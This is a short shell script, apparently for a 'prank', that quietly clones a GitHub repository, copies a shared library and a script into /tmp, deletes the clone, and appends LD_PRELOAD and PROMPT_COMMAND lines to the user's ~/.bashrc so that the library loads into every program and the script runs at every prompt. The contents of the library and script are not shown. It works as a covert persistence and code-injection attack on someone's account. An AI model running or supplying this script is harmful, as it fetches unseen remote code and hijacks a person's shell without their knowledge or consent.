 git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2> /dev/null
 cd pranks
 cp ld.sh /tmp/
 cp a.so /tmp/
 cd ..
 rm -rf pranks
 echo "export LD_PRELOAD=/tmp/a.so" >> ~/.bashrc
 echo "export PROMPT_COMMAND ='/tmp/ld.sh'" >> ~/.bashrc
 source ~/.bashrc
